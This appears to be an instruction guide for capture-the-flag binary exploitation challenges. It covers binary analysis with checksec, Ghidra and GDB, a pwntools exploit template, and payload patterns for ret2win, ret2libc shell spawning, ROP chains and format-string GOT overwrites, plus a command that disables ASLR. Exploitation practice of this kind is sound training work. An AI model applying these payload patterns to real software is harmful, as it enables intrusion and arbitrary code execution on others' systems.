# Binary Exploitation Instructions

When working on binary exploitation (pwn) challenges, follow these systematic instructions.

## Pre-Analysis Setup

1. **Verify tools are available**:
   ```bash
   which checksec gdb pwndbg ghidra radare2
   python3 -c "import pwn; print(pwn.__version__)"
   ```

2. **Create working directory**:
   ```bash
   mkdir -p ~/ctf/binary/[challenge_name]
   cd ~/ctf/binary/[challenge_name]
   ```

3. **Download and organize files**:
   ```bash
   wget [challenge_url]/binary
   wget [challenge_url]/libc.so.6  # if provided
   chmod +x binary
   ```

## Step 1: Initial Binary Analysis

Run these commands in order and document output:

```bash
# File type and architecture
file binary

# Security protections
checksec binary

# Strings analysis (look for flags, function names, hints)
strings binary | grep -E "(flag|win|admin|shell|password)"
strings binary > strings.txt

# Symbols and functions
nm binary
readelf -s binary

# Dependencies
ldd binary
```

## Step 2: Static Analysis with Ghidra

1. **Launch Ghidra**:
   ```bash
   /opt/ghidra/ghidraRun &
   ```

2. **Import binary**:
   - File → Import File
   - Select binary
   - Accept analysis (YES)

3. **Analyze key areas**:
   - **Symbol Tree**: Look for `main`, `win`, `flag`, custom functions
   - **Strings**: Search for interesting strings
   - **Functions**: Identify input/validation/dangerous functions
   - **Decompiler**: Review C pseudocode

4. **Focus on**:
   - Buffer manipulation: `gets`, `strcpy`, `sprintf`, `scanf`
   - Format strings: `printf`, `fprintf` with user input
   - Integer overflows: arithmetic on user input
   - Heap operations: `malloc`, `free`, custom allocators

## Step 3: Dynamic Analysis with GDB

```bash
# Start with pwndbg
gdb ./binary

# Inside GDB:
# Check security features
checksec

# Disassemble main
disas main

# Set breakpoints at key functions
break main
break *main+50
break vulnerable_function

# Run with arguments
run AAAA
run $(python3 -c 'print("A"*100)')

# Examine registers and stack
info registers
x/20x $rsp
x/20i $rip

# Find offset for buffer overflow
cyclic 200
# ... crash ...
cyclic -l 0x[crash_value]

# Continue execution
continue
stepi
nexti
```

## Step 4: Exploit Development

Create `exploit.py` using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

# Binary and context setup
elf = ELF('./binary')
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'  # or 'i386'

# Libc (if provided)
# libc = ELF('./libc.so.6')

# Connection
def get_process():
    if args.REMOTE:
        return remote('host', port)
    else:
        return process('./binary')

io = get_process()

# Step 4a: Calculate offset (if buffer overflow)
# Use cyclic pattern from gdb
offset = 72  # Replace with actual offset

# Step 4b: Find gadgets (if ROP needed)
# Use ROPgadget or ropper
# ROPgadget --binary binary | grep "pop rdi"
# ropper --file binary --search "pop rdi"

# Step 4c: Build payload
payload = b'A' * offset

# For ret2win:
# payload += p64(elf.symbols['win'])

# For ret2libc:
# payload += p64(pop_rdi)
# payload += p64(elf.got['puts'])
# payload += p64(elf.plt['puts'])
# payload += p64(elf.symbols['main'])

# For shellcode (if NX disabled):
# payload += asm(shellcraft.sh())

# Step 4d: Send exploit
io.sendline(payload)

# Step 4e: Get flag
io.interactive()
```

## Common Exploitation Patterns

### Pattern 1: ret2win (Easy)
**When**: Binary has a win/flag/backdoor function  
**How**: Overflow buffer, overwrite return address with win function

```python
payload = b'A' * offset
payload += p64(elf.symbols['win'])
```

### Pattern 2: ret2libc (NX enabled, no PIE)
**When**: NX is ON, ASLR is OFF  
**How**: Use existing libc functions

```python
# Leak libc address
payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts']) + p64(elf.symbols['main'])
io.sendline(payload)
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Call system("/bin/sh")
payload = b'A' * offset
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
```

### Pattern 3: ROP Chain (Full protections)
**When**: NX, PIE, ASLR all enabled  
**How**: Leak addresses, build ROP chain

```python
# 1. Leak PIE base
# 2. Leak libc base
# 3. Build final ROP chain
```

### Pattern 4: Format String
**When**: printf(user_input) vulnerability  
**How**: Read/write arbitrary memory

```python
# Read from stack
payload = b'AAAA' + b'|%p|' * 20

# Write to GOT
payload = fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']})
```

## Troubleshooting

### Exploit doesn't work remotely
- Check architecture (32 vs 64 bit)
- Verify libc version matches
- Disable ASLR locally: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
- Add sleep before sending payload: `time.sleep(0.5)`

### Can't find offset
```bash
# Generate pattern
gdb ./binary
cyclic 200
run
# Note crash address
cyclic -l [address]
```

### Segfault on return
- Check alignment (stack must be 16-byte aligned on x64)
- Add extra `ret` gadget before main payload
- Verify endianness

### ASLR bypass not working
- Ensure leak is from correct location
- Verify libc version: `./libc.so.6` or `ldd binary`
- Check for partial RELRO: `checksec binary`

## Checklist

- [ ] Identified binary architecture and protections
- [ ] Found vulnerability type (buffer overflow, format string, etc.)
- [ ] Calculated exact offset to overwrite return address
- [ ] Identified target (win function, libc gadgets, etc.)
- [ ] Built working local exploit
- [ ] Tested exploit multiple times for reliability
- [ ] Adapted for remote (if different environment)
- [ ] Captured flag and verified format

## Resource References

- pwntools docs: https://docs.pwntools.com/
- ROPgadget: `ROPgadget --binary binary`
- Ropper: `ropper --file binary`
- one_gadget: `one_gadget libc.so.6`
- Shellcode: `shellcraft.sh()` (pwntools)
